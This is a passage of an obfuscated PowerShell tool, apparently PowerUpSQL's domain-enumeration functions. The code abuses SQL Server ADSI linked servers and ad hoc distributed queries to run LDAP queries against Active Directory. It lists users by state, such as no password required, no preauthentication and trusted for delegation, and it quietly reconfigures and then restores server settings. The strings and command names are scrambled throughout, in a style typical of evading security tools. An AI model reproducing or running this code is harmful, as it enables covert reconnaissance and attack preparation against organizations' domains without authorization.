            ${r`ANDoMlI`NK`N`Ame} = (-join ((65..90) + (97..122) | &("{2}{0}{1}" -f't-R','andom','Ge') -Count 8 | &('%') {[char]${_}}))                                

            
            If (-not(${sUPPrE`sS`VERBO`Se})){
                &("{2}{1}{0}{3}"-f 'e-Ver','t','Wri','bose') -Message ("$Instance "+': '+'Cr'+'eati'+'ng '+'A'+'DSI '+'SQ'+'L '+'Ser'+'ve'+'r '+'lin'+'k '+'named'+' '+"$RandomLinkName.")
            }

            
            ${Q`UERYcreA`TELInK} = ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Creat'+'e '+'SQ'+'L '+'S'+'e'+'rver '+'link'+' '+'to'+' '+'A'+'DS'+'I
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'IF'+' '+'(SE'+'LECT '+'count('+'*'+') '+'FR'+'OM '+'mas'+'ter..'+'sysserv'+'ers '+'WHE'+'RE'+' '+'sr'+'vname '+'= '+"'$RandomLinkName') "+'= '+'0
'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXE'+'C '+'mas'+'ter.'+'dbo.'+'sp_ad'+'dli'+'n'+'kedserve'+'r'+' '+'@'+'server '+'= '+"N'$RandomLinkName', "+'
'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@srvprod'+'u'+'ct='+'N'+'H'+'9AAct'+'ive'+' ')  -CreplaCE ([cHAR]72+[cHAR]57+[cHAR]65),[cHAR]39)+'Direct'+'ory'+' '+'S'+'ervi'+'ce '+(('Int'+'erfac'+'es1D'+'c, ')-CrepLaCE ([CHAR]49+[CHAR]68+[CHAR]99),[CHAR]39)+'
'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@prov'+'ider=N{0}A'+'DSDSO'+'O'+'bj'+'e'+'c'+'t{0}, ')-f  [Char]39+'
	'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@d'+'atasrc=Nhu2a'+'d'+'s'+'dat'+'a'+'s'+'ou'+'rcehu2'+'
 ')  -CrEPLaCE  'hu2',[CHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELSE
'+'	'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELECT'+' '+('Uw'+'DTh'+'e ')."repLA`Ce"(([chaR]85+[chaR]119+[chaR]68),[StrINg][chaR]39)+'targe'+'t'+' '+'SQ'+'L '+'Serve'+'r'+' '+'link'+' '+'alr'+'eady '+('exists.{'+'0}')  -F [cHaR]39)

            
            ${qUery`cRE`ATeL`I`NKR`ESulTS} = &("{1}{2}{0}"-f'y','Get-SQL','Quer') -Instance ${INs`Tance} -Query ${quE`R`ycREatElinK} -Username ${u`S`ERnamE} -Password ${paS`s`wORd} -Credential ${C`Re`Den`TiAl} -ReturnError
           
            
            if((${link`Use`Rn`Ame}) -and (${L`iNK`PAsSw`oRD})){

                
                If (-not(${SUPp`Re`SSVe`R`BOse})){
                    &("{2}{0}{3}{1}" -f't','-Verbose','Wri','e') -Message ("$Instance "+': '+'Asso'+'ci'+'ati'+'ng '+'login'+' '+"'$LinkUsername' "+'with'+' '+'ADS'+'I '+'SQ'+'L '+'Ser'+'ver '+'link'+' '+'n'+'amed '+"$RandomLinkName.")
                }

                ${qu`EryAS`s`o`CiAT`e`lOgiN} = ('

'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EX'+'EC '+'sp_addlinked'+'srv'+'l'+'og'+'i'+'n '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"@rmtsrvname=N'$RandomLinkName',
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@useself=NbG6Fa'+'l'+'s'+'ebG6'+','+'
 ') -cREpLAcE ([chAR]98+[chAR]71+[chAR]54),[chAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@loca'+'l'+'lo'+'gin=NULL,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"@rmtuser=N'$LinkUsername',
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"@rmtpassword=N'$LinkPassword'")                                           

            }else{

                
                If (-not(${sUpPRES`S`Ve`RbO`se})){
                    &("{0}{3}{2}{1}" -f'Wr','ose','erb','ite-V') -Message ("$Instance "+': '+'Ass'+'oc'+'iati'+'ng '+"'$SQLCurrentLogin' "+'with'+' '+'ADS'+'I '+'SQL'+' '+'Se'+'rver'+' '+'lin'+'k '+'na'+'med '+"$RandomLinkName.")
                }

                ${queryAss`OCIa`TE`lo`gIn} = ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Curre'+'nt '+'U'+'ser '+'Co'+'ntext'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'No'+'te'+'s: '+'test'+'in'+'g '+'tb'+'d, '+'sq'+'l '+'l'+'ogin '+'(no'+'n '+'sys'+'a'+'dmin), '+'sq'+'l '+'lo'+'g'+'in '+'('+'sys'+'a'+'dmin), '+'w'+'in'+'dows '+'l'+'ogi'+'n '+'(n'+'onsysad'+'min),'+' '+'wi'+'ndo'+'ws '+'l'+'og'+'in '+'(s'+'ys'+'adm'+'in), '+'- '+'t'+'est '+'p'+'as'+'sthru '+'a'+'nd '+'provi'+'ded'+' '+'cre'+'ds'+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXEC'+' '+'sp_ad'+'dlinked'+'s'+'rvlogin '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"@rmtsrvname=N'$RandomLinkName',
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@'+'usese'+'lf'+'='+'NQJnT'+'rueQJn,
 ')."re`P`lACE"('QJn',[sTriNg][cHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@l'+'oca'+'l'+'login=NULL,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@rmtuser='+'NUL'+'L,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@rm'+'tpass'+'w'+'ord=NULL')
            }                                

            
            &("{2}{1}{0}{3}" -f 'QLQu','t-S','Ge','ery') -Instance ${IN`sTANCe} -Query ${Q`UeRYA`SSoci`ATeLOG`In} -Username ${userN`AMe} -Password ${P`ASsw`oRD} -Credential ${c`RE`deN`TIal} -SuppressVerbose 

        }        

        
        if(${U`sEa`Dh`oc}){
            
            
            ${orIgiNal`_st`A`T`e`_`shOwaDv} = &("{1}{2}{3}{0}"-f 'y','Get-','SQLQu','er') -Instance ${inSTa`N`ce} -Query ((("{7}{8}{5}{1}{3}{4}{11}{13}{9}{6}{2}{0}{10}{12}" -f 'w adv',' value_in','like Ojmsho','_','use','ECT','HERE name ','S','EL','configurations W','anced opti',' FROM master.sy','onsOjm','s.'))."ReP`LAcE"(([cHaR]79+[cHaR]106+[cHaR]109),[sTRIng][cHaR]39)) -Username ${u`S`eR`Name} -Password ${pa`Ss`word} -Credential ${Cr`eD`eN`TIAl} -SuppressVerbose | &("{0}{2}{1}" -f'Selec','ct','t-Obje') ("{1}{2}{3}{0}" -f 'e','value','_in_','us') -ExpandProperty ("{2}{1}{0}{3}"-f'_u','n','value_i','se')
            ${or`I`gINaL_STAt`E_ADHo`cqU`E`RY} = &("{1}{2}{0}" -f'uery','Get-S','QLQ') -Instance ${Ins`TaNCe} -Query ((("{8}{22}{3}{18}{17}{1}{24}{12}{21}{5}{20}{7}{23}{13}{10}{2}{4}{28}{11}{26}{19}{9}{14}{27}{16}{25}{15}{6}{0}" -f 'eriesXzr','use F','HE','CT valu','R','er','ted Qu','onf','SEL','ke X','W','me','OM ma','s ','zrA','tribu','Hoc','_','e_in','i','.sys.c','st','E','iguration','R',' Dis',' l','d ','E na'))  -ReplACe([CHAR]88+[CHAR]122+[CHAR]114),[CHAR]39) -Username ${uSe`Rn`AME} -Password ${PAsS`Wo`RD} -Credential ${C`REDe`NTIaL} -SuppressVerbose | &("{2}{3}{0}{1}" -f'j','ect','Sele','ct-Ob') ("{2}{1}{0}{3}" -f '_','in','value_','use') -ExpandProperty ("{2}{0}{1}" -f'in_','use','value_')

            
            if(${oRI`gin`AL_StaTe_`sHO`W`Adv} -eq 0){
                
                
                &("{2}{1}{0}"-f 'LQuery','Q','Get-S') -Instance ${i`Ns`TaNce} -Query ((("{12}{0}{14}{2}{5}{4}{7}{6}{1}{8}{10}{11}{3}{15}{13}{9}" -f'ur','van','0','C','Sho','}','Ad','w ','ced ','RE','Opt','ions{0},1;RE','sp_config','GU','e {','ONFI'))  -f [cHar]39) -Username ${uS`ER`NAMe} -Password ${PasS`w`OrD} -Credential ${CreD`EN`TiAl} -SuppressVerbose                  

                
                If (-not(${su`p`PRES`sveR`BOse})){
                    &("{2}{1}{0}"-f 'e-Verbose','rit','W') -Message ("$Instance "+': '+'Ena'+'b'+'l'+'ing '+(('sxKS'+'h'+'ow ')-crePLaCE  'sxK',[cHaR]39)+'Adv'+'a'+'nced '+('Option'+'s{'+'0'+'}')  -F[cHar]39)
                }
            }else{
                If (-not(${SU`PPr`ES`SVERBoSE})){
                    &("{2}{1}{0}"-f'se','te-Verbo','Wri') -Message ("$Instance "+': '+(('B50S'+'ho'+'w ')-rEPLACE 'B50',[Char]39)+'Adva'+'n'+'ce'+'d '+(('O'+'ptions0sm'+' ')-cREPlaCE'0sm',[ChAR]39)+'is'+' '+'alread'+'y'+' '+'en'+'abled')
                }
            }

            
            if(${OrIgI`Na`L`_`stATE`_a`dHoC`QUeRY} -eq 0){               

                
                &("{0}{2}{1}" -f 'Get-S','LQuery','Q') -Instance ${i`NsT`Ance} -Query ((("{7}{2}{5}{3}{4}{9}{6}{0}{1}{8}" -f 'ed Querie','s{0},1','co','figure {0}Ad',' Ho','n','Distribut','sp_',';RECONFIGURE','c ')) -F  [cHAR]39) -Username ${US`eRn`AMe} -Password ${PAs`s`W`ord} -Credential ${cr`E`DeNtIAl} -SuppressVerbose                

                
                If (-not(${suPpREs`Sv`erB`o`sE})){
                    &("{0}{2}{3}{1}" -f'Wri','Verbose','te','-') -Message ("$Instance "+': '+'E'+'n'+'abling '+('p'+'tqA'+'d ')."RePl`ACe"('ptq',[stRInG][CHar]39)+'Hoc'+' '+'D'+'ist'+'ribute'+'d '+(('Que'+'ri'+'e'+'sFGt') -CrepLace 'FGt',[Char]39))
                }
            }else{
                If (-not(${sUpPrEssVe`R`BO`Se})){
                    &("{2}{0}{1}"-f 'r','bose','Write-Ve') -Message ("$Instance "+': '+('{0}Ad'+' ') -f [CHAR]39+'H'+'oc '+'Distr'+'ibuted'+' '+('Que'+'r'+'i'+'esY81 ')."R`ePLaCe"('Y81',[strINg][ChaR]39)+'a'+'re '+'alre'+'ady'+' '+'e'+'na'+'bled')
                }
            }
        }

        
        if(${UsEA`DH`oc}){

            
            if((${Linkus`ER`NamE}) -and (${LINK`PASSW`ORd})){
                ${ADH`OC`AUTh} = ('User'+' '+"ID=$LinkUsername; "+"Password=$LinkPassword;")                
            }else{
                ${ADHoca`U`TH} = ("{0}{2}{1}{3}"-f 'ads','asour','dat','ce') 
            }

            
            ${Q`UeRY} = ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'R'+'un '+'w'+'ith '+'cre'+'den'+'tial '+'in'+' '+'s'+'yn'+'tax '+'opt'+'ion '+'1 '+'- '+'works'+' '+'a'+'s '+'s'+'a
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELECT'+' '+'*
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+"OPENROWSET('ADSDSOOBJECT','$AdHocAuth',
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'<LDAP://$LdapPath>;$LdapFilter;$LdapFields;subtree')")
        }else{

            
            ${Q`UERY}  = ('SEL'+'EC'+'T '+'* '+'FRO'+'M '+"OpenQuery($RandomLinkName,'<LDAP://$LdapPath>;$LdapFilter;$LdapFields;subtree')")                 
        }                        
        
        
        
            
        
        If (-not(${suPprE`s`S`VerB`OSE})){
            &("{2}{3}{0}{4}{1}"-f'Ver','se','W','rite-','bo') -Message ("$Instance "+': '+'LDA'+'P '+'qu'+'ery '+'a'+'gai'+'nst '+'lo'+'gon '+'se'+'rver '+'usi'+'n'+'g '+'AD'+'SI '+'O'+'L'+'EDB '+'star'+'ted..'+'.')
        }        

        
        ${TBL`REsul`Ts} = &("{1}{0}{2}{3}"-f'S','Get-','QLQu','ery') -Instance ${I`Ns`TANce} -Query ${quE`RY} -Username ${uSE`RNa`ME} -Password ${pA`Sswo`RD} -Credential ${C`ReDENtI`Al}

        
        ${T`BL`d`oMAINOb`j`EcTS} += ${tb`LR`EsUL`TS}         
        
        
        if(-not ${USead`H`oc}){
            
            
            If (-not(${s`UpPReS`svE`R`BOse})){
                &("{1}{2}{0}"-f 'rbose','Wr','ite-Ve') -Message ("$Instance "+': '+'Re'+'movi'+'ng '+'A'+'DSI '+'SQL'+' '+'Ser'+'ver'+' '+'link'+' '+'name'+'d '+"$RandomLinkName")
            }

            
            ${rEMOv`e`lIn`kQ`UErY} = ('E'+'XEC '+'master.'+'dbo.sp_'+'d'+'rops'+'erver'+' '+"@server=N'$RandomLinkName', "+('@'+'dr'+'oplog'+'ins={0}'+'dr'+'o'+'plogins{'+'0'+'}') -f[cHAR]39)

            
            ${r`EMOV`ELiNkqUeryr`ESU`l`Ts} = &("{1}{2}{0}{3}" -f'-SQLQuer','G','et','y') -Instance ${INs`T`ANce} -Query ${r`EMo`VeLIN`KqU`eRy} -Username ${u`sE`RnAME} -Password ${pAS`S`WoRD} -Credential ${C`ReDenT`Ial} -SuppressVerbose
        }

        
        if(${u`SeAd`hOC}){
            
            
            If (-not(${sUp`PreSS`V`ErB`Ose})){
                &("{0}{2}{1}"-f'Writ','ose','e-Verb') -Message ("$Instance "+': '+'Resto'+'ri'+'ng '+'AdHoc'+' '+'se'+'tti'+'ngs '+'i'+'f '+'n'+'eeded.')
            }
            
            
            &("{2}{1}{0}{3}"-f'S','t-','Ge','QLQuery') -Instance ${INs`TAN`cE} -Query ('sp_'+'config'+'u'+'re '+('{0'+'}'+'Ad ')-F [char]39+'Ho'+'c '+'D'+'istribu'+'ted '+"Queries',$Original_State_AdHocQuery;RECONFIGURE") -Username ${u`seR`NAme} -Password ${P`ASSW`ORD} -Credential ${cre`D`enT`ial} -SuppressVerbose        

            
            &("{1}{0}{2}"-f'SQLQ','Get-','uery') -Instance ${Ins`T`AnCE} -Query ('sp_'+'config'+'ure'+' '+('{0}'+'Show ')  -f [chAR]39+'Ad'+'va'+'nced '+"Options',$Original_State_ShowAdv;RECONFIGURE") -Username ${Use`RnA`mE} -Password ${p`AssWo`Rd} -Credential ${cRE`dEnTI`AL} -SuppressVerbose              
        }

        
        If (-not(${s`UpP`ResS`VeRb`oSE})){
            &("{2}{1}{0}" -f 'Verbose','e-','Writ') -Message ("$Instance "+': '+'L'+'DAP '+'que'+'ry '+'a'+'ga'+'inst '+'l'+'ogon '+'s'+'erve'+'r '+'us'+'ing '+'AD'+'SI '+'OLE'+'DB '+'comp'+'lete.')
        } 
    }

    End
    {
        
        ${RE`CORDcou`Nt} = ${tBlDOMaI`NO`Bje`CTS}."r`Ow"."Co`Unt"

        
        If (-not(${sUP`PRE`sSVeRb`OSE})){
            &("{3}{2}{0}{1}"-f'e-Verbo','se','rit','W') -Message ("$Instance "+': '+"$RecordCount "+'r'+'ecor'+'ds '+'were'+' '+'f'+'ound.')
        } 

        
        return ${tbL`DomAi`NobjEc`TS}
    }
}






Function  gET-S`Q`lDoM`AINUS`ER
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAnDAtORY = ${fa`LSe},
        hElPmEssaGe = {"{2}{3}{6}{5}{9}{1}{7}{0}{4}{8}" -f'a','auth','SQL Ser','ver or domai','te to SQL ','ccou','n a','entic','Server.','nt to '})]
        [string]${U`SER`Na`Me},

        [Parameter(mANdATorY = ${FA`LSE},
        hELPmESsaGE = {"{1}{6}{9}{10}{5}{4}{3}{0}{14}{8}{2}{15}{13}{16}{12}{7}{11}" -f 'assw','SQL Server o','uthe','unt p','acco',' ','r','erver','to a',' d','omain','.',' S','ate to ','ord ','ntic','SQL'})]
        [string]${paSsW`oRd},

        [Parameter(manDaTory = ${f`AL`Se},
        hElpmessAGE = {"{5}{10}{1}{13}{0}{14}{2}{9}{11}{4}{12}{15}{8}{3}{7}{6}"-f'ount ','ain ','ate to LDAP t','lin','S','D','.','k','SI ','hroug','om','h ','QL ','acc','used to authentic','Server AD'})]
        [string]${lin`kuSeR`N`AMe},

        [Parameter(mANDaTOrY = ${FAL`Se},
        helPMeSsaGE = {"{14}{12}{5}{1}{7}{8}{11}{0}{2}{13}{16}{9}{4}{10}{15}{3}{6}" -f 'e ','ou','t','SI ',' through SQL Se','in acc','link.','nt p','assword used to a','P','rver A','uthenticat','a','o','Dom','D',' LDA'})]
        [string]${L`iNkPAsSwo`RD},

        [Parameter(MAnDaTOrY = ${F`Alse},
        HelPMEssAGe = {"{3}{4}{2}{1}{5}{0}{6}" -f'als','nt','rede','W','indows c','i','.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cred`E`NTI`AL} =   (vARiablE  0459M2 -vALueo  )::"EMp`Ty",

        [Parameter(maNDAtOry = ${F`Al`se},
        vAlUefroMpipELinebYprOPERtyNAme = ${tR`Ue},
        hELPMEsSage = {"{1}{8}{2}{3}{4}{9}{10}{5}{0}{6}{7}" -f 'tion','SQ',' ','Ser','ver inst','nec',' t','o.','L','anc','e to con'})]
        [string]${I`NsTANCe},

        [Parameter(mandAtOry = ${Fa`l`se},
        HelpmEssaGe = {"{39}{28}{34}{2}{40}{6}{20}{14}{23}{21}{18}{12}{15}{25}{11}{8}{4}{19}{29}{3}{44}{43}{17}{1}{45}{31}{26}{36}{16}{30}{10}{7}{27}{38}{32}{22}{42}{9}{37}{13}{24}{35}{5}{33}{0}{41}"-f 'use OpenR',' create a','for e','aul','The','ies, ','i','use OpenQu','k.  ',' option wil','ink and ','rver lin','ad ','ena','ry in','of a','r','ll','e',' link','ng the que','t','he AdH','s','ble adhoc que',' se',' se','e','tio',' option (def',' l','DSI',' T','and ','n ','r','rve','l ','ry.','Use adhoc connec','xecut','owSet.','oc',' wi','t)','n A'})]
        [Switch]${usE`Adh`oC},

        [Parameter(manDATOrY = ${F`Alse},
        HELPMESsaGe = {"{9}{7}{3}{5}{10}{8}{4}{6}{0}{1}{2}" -f 'e or property ','settin','gs.','s','d','ers ',' on stat','er u','se','Filt','ba'})]
        [ValidateSet("All",{"{0}{2}{1}"-f'Enab','ed','l'},{"{2}{1}{0}"-f'abled','s','Di'},{"{1}{0}"-f'cked','Lo'},{"{1}{4}{2}{3}{0}"-f 'ires','PwN','rEx','p','eve'},{"{0}{1}{2}" -f 'Pw','No','tRequired'},{"{1}{0}{2}{3}{4}" -f't','PreAu','hN','otReq','uired'},{"{1}{0}{3}{2}{4}{5}"-f'martCardR','S','i','equ','re','d'},{"{5}{6}{4}{2}{1}{3}{0}"-f 'ation','ted','s','ForDeleg','u','T','r'},{"{3}{0}{5}{2}{1}{4}" -f 'rustedToAuthFo','ga','Dele','T','tion','r'},{"{0}{1}{3}{2}"-f 'Pw','St','RevEnc','ored'})]
        [String]${u`sers`T`Ate},

        [Parameter(Mandatory = ${Fal`Se},
        ValUefROmPiPelINEBypRoPertynaMe = ${tR`UE},
        helPmeSsAGE = {"{3}{0}{1}{2}" -f ' to q','u','ery.','Domain'})]
        [string]${TA`R`GEtDOmaiN},

        [Parameter(maNDAtory = ${FA`Lse},
        valuEfROmPIPELInebYProPertYNAMe = ${tR`Ue},
        helpmessaGE = {"{5}{3}{4}{1}{7}{0}{6}{2}{8}" -f'er','i','f','o',' f','Domain user t',' ','lt','or.'})]
        [string]${f`ILteR`US`er},

        [Parameter(MaNdAtorY = ${f`A`LSE},
        valUefrOMpIPeLInEbYPRoPeRTyNAmE = ${T`RUE},
        helpMesSAge = {"{21}{22}{7}{1}{0}{11}{17}{16}{4}{15}{3}{19}{20}{12}{6}{8}{14}{23}{2}{10}{13}{9}{5}{18}"-f 'o h','sers wh','in the n','t c','n','ays pro','ir p',' the u','assw','d','u','a','e','mber of ','o','o',' ','ve','vided.','hanged',' th','Only',' list','rd '})]
        [Int]${pwla`s`TsEt},

        [Parameter(mANdATory = ${fa`lse},
        HelPmEssAgE = {"{1}{5}{6}{3}{7}{8}{11}{0}{10}{2}{4}{9}"-f'un','Suppr','on is w','bose ','ra','ess',' ver','er','rors.  ','pped.','cti','Used when f'})]
        [switch]${SU`PPr`Essv`eRBOsE}
    )

    Begin
    {
        
        if(-not ${I`NSTaNCe})
        {
            ${In`STaN`ce} = ${ENv:`Com`putEr`N`A`ME}
        }

        
        if((-not ${fILt`erU`S`ER})){
            ${FiLTE`RU`sER} = '*'
        }

        
        if((-not ${p`w`lAs`TSET})){
            ${p`WLa`sTSET`FIlt`Er} = ""
        }else{

            
            ${desiR`EdT`im`EStamp} = (&("{2}{0}{1}"-f'a','te','Get-D')).("{0}{1}"-f 'Add','Days').Invoke(-${pW`LAST`set}).("{2}{1}{0}"-f 'ileTime','F','To').Invoke()

            
            ${Pwl`A`StsEt`F`ILTEr} = "(!pwdLastSet>=$DesiredTimeStamp)"
        }

        
        switch (${UseR`s`TATe})
        {
            "All"                         {${US`ErSta`TEFIL`TeR} = ""} 
            ("{0}{1}" -f'Enab','led')                     {${us`e`RstA`TEfilT`er} = ("{3}{4}{0}{2}{7}{8}{6}{1}{5}" -f'serAcc','0.113556.1','oun','(!','u','.4.803:=2)','.84','tControl',':1.2')} 
            ("{2}{0}{1}"-f'sab','led','Di')                    {${usErS`T`AT`e`FIlTer} = (("{8}{2}{1}{0}{4}{9}{3}{5}{6}{7}" -f'rol:','untCont','Acco','3556.1.','1.2.840.','4.80','3:=2',')','(user','11'))} 
            ("{1}{0}"-f'ed','Lock')                      {${U`se`RSt`AtEfIlTER} = (("{3}{5}{4}{1}{7}{6}{8}{0}{2}"-f'Ti','=805306368','me>0)','(sA','ountType','MAcc','cko',')(lo','ut'))}
            ("{0}{1}{2}{3}"-f 'PwNever','Exp','ir','es')              {${uSerSt`A`TEFIl`Ter} = ("{1}{12}{4}{11}{13}{6}{14}{7}{9}{10}{3}{0}{5}{2}{8}" -f '.4.80','(','6553','56.1','tr','3:=','.2.8','0','6)','.113','5','ol','userAccountCon',':1','4')} 
            ("{3}{2}{1}{0}" -f'quired','tRe','o','PwN')               {${Us`erST`AteFi`lTeR} = ("{3}{6}{2}{7}{8}{0}{9}{4}{1}{5}"-f '2','3','ountC','(use','0',':=32)','rAcc','ontr','ol:1.','.840.113556.1.4.8')}
            ("{1}{2}{3}{0}"-f'Enc','P','wStoredRe','v')              {${u`s`ersTAT`EFilTer} = ("{3}{5}{8}{2}{11}{6}{0}{4}{10}{1}{12}{7}{9}" -f'.113556.1.4','3:=1','tro','(userAccount','.8','Co','.2.840','8','n',')','0','l:1','2')}
            ("{0}{4}{2}{3}{1}"-f'P','ed','NotRequi','r','reAuth')          {${uSERSTA`T`efi`lT`eR} = (("{12}{1}{9}{13}{7}{2}{14}{8}{10}{3}{11}{5}{0}{6}{4}" -f'3:=419','userA','Con','0.1135',')','80','4304','t','o','cco','l:1.2.84','56.1.4.','(','un','tr'))}
            ("{4}{0}{3}{2}{1}"-f'ma','equired','ardR','rtC','S')           {${Us`ersT`ATEfIl`T`eR} = ("{8}{5}{3}{2}{9}{6}{10}{4}{1}{0}{7}{11}"-f'3:=2621','.4.80','trol','on','40.113556.1','serAccountC','.','4','(u',':1','2.8','4)')}
            ("{2}{3}{5}{4}{0}{1}"-f'egatio','n','Tr','ust','el','edForD')        {${u`S`erSTAtefI`L`TeR} = (("{2}{6}{4}{5}{0}{3}{7}{8}{9}{1}"-f'1355','=524288)','(userAcc','6','ntrol',':1.2.840.1','ountCo','.1.4.','803',':'))}
            ("{2}{3}{0}{1}{4}"-f'stedToAut','hFor','Tr','u','Delegation')  {${USE`RsTAT`E`FIltEr} = (("{4}{9}{10}{7}{8}{2}{5}{6}{1}{3}{0}" -f '6777216)','3556.1.4','0','.803:=1','(','.','11','ontrol:1','.2.84','use','rAccountC'))}
        }
    }

    Process
    {
        
        if(${uSE`Adh`oC}){
            &("{3}{0}{2}{1}"-f'-','omainObject','SQLD','Get') -Verbose -Instance ${I`NstA`N`cE} -Username ${u`SEr`NAMe} -Password ${PaSS`WO`RD} -LinkUsername ${L`inK`U`sern`AME} -LinkPassword ${Link`P`AsSw`orD} -LdapPath ${taR`G`etDoMAIn} -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields ("{16}{0}{10}{2}{8}{14}{11}{15}{7}{17}{5}{1}{13}{3}{9}{6}{12}{4}" -f 'accoun',',when',',nam','n','th','ed',',adsp','nt,whencr','e,ad','ged','tname','co','a','cha','min','u','sam','eat') -UseAdHoc            
        }else{
            &("{6}{1}{5}{0}{3}{2}{4}"-f 'SQL','t','inObje','Doma','ct','-','Ge') -Verbose -Instance ${I`NS`TAN`ce} -Username ${usE`R`NAme} -Password ${P`AsSwO`Rd} -LinkUsername ${linKu`se`Rn`Ame} -LinkPassword ${lINkPA`sS`Word} -LdapPath ${ta`Rg`eT`dOmaIN} -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields ("{5}{1}{8}{11}{12}{7}{2}{9}{3}{0}{10}{4}{6}" -f 'reated,whencha','ma','o','nt,whenc','dspa','sa','th','nc','ccountname','u','nged,a',',','name,admi')          
        }
    }

    End
    {                                       
    }
}






Function  G`eT-sql`doMA`INsUBneT
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandatORy = ${F`AlsE},
        HelpMesSAGe = {"{7}{10}{0}{6}{15}{3}{9}{4}{14}{1}{11}{8}{13}{5}{12}{2}"-f 've','unt to au','.','d','a','Serve','r ','SQL S','e to S','om','er','thenticat','r','QL ','in acco','or '})]
        [string]${U`SeRnAME},

        [Parameter(mANDAtORy = ${faL`se},
        HelpmesSaGE = {"{6}{1}{4}{2}{13}{7}{3}{9}{11}{0}{8}{5}{12}{10}"-f 'ica','QL Server o','a','accoun','r dom',' SQL Serv','S','n ','te to','t p','.','assword to authent','er','i'})]
        [string]${p`Ass`woRd},

        [Parameter(MANdAtORy = ${FAL`Se},
        HeLpmESsagE = {"{8}{11}{5}{2}{9}{6}{4}{1}{7}{0}{12}{3}{10}"-f'Server ','to LDAP t','authe','DSI li','te ',' ','ca','hrough SQL ','Domain account','nti','nk.',' used to','A'})]
        [string]${li`Nk`Us`ername},

        [Parameter(mAndAtory = ${fA`LSE},
        HElpmeSsaGe = {"{1}{7}{3}{4}{12}{9}{0}{6}{11}{2}{10}{8}{5}"-f'nti','Do',' LDAP through SQL ','n account pas','sword',' link.','cate t','mai','ADSI','sed to authe','Server ','o',' u'})]
        [string]${l`iNKP`AS`s`word},

        [Parameter(MaNDaTORy = ${fA`LSe},
        HElpmESsAGe = {"{1}{2}{0}{3}"-f's cred','Wi','ndow','entials.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRed`e`NT`iaL} =   (  Get-vARiablE  ('0'+'459m'+'2') ).VALuE::"e`mpTY",

        [Parameter(MaNdATORy = ${FA`lSe},
                vALuefroMPiPeLinEByProPERTYNaMe = ${T`Rue},
        heLpMEssAGe = {"{6}{1}{7}{2}{3}{8}{5}{0}{4}"-f'n ','ver ',' t','o co','to.','o','SQL Ser','instance','nnecti'})]
        [string]${In`STAN`Ce},

        [Parameter(mAnDaToRy = ${FAL`SE},
        HElPmEsSAGE = {"{41}{11}{40}{29}{26}{0}{4}{2}{18}{21}{17}{14}{20}{7}{39}{33}{46}{38}{36}{47}{25}{28}{35}{32}{30}{6}{19}{1}{22}{27}{37}{24}{13}{44}{3}{31}{23}{42}{15}{10}{34}{9}{16}{45}{12}{43}{5}{8}" -f'xecut','I ','g',' ','in','nRowSe','te a','stead ','t.','uerie',' enable ','adhoc connection','use O','o','que','l','s, ','he ',' ','n ADS','ry in','t','server link and use O','tion wi','. The AdH','link opt','e','penQue','ion (','or ','ea','op','fault) will cr','r','adhoc q','de','T','ry','  ','of a se',' f','Use ','l','pe','c','and ','ver link.','he '})]
        [Switch]${us`eA`dHoC},

        [Parameter(mandatorY = ${FaL`Se},
        VaLuefromPiPelINEByPROPErtyNAmE = ${t`Rue},
        HelPMESsAGe = {"{2}{0}{1}{3}{4}" -f'n to ','que','Domai','r','y.'})]
        [string]${t`ArgE`TD`OMAin},

        [Parameter(MANDATORy = ${f`ALSe},
        heLPMESsaGE = {"{7}{4}{1}{5}{9}{8}{0}{10}{2}{6}{3}"-f 'd wh','r','nction','.','upp','ess ve',' is wrapped','S','errors.  Use','rbose ','en fu'})]
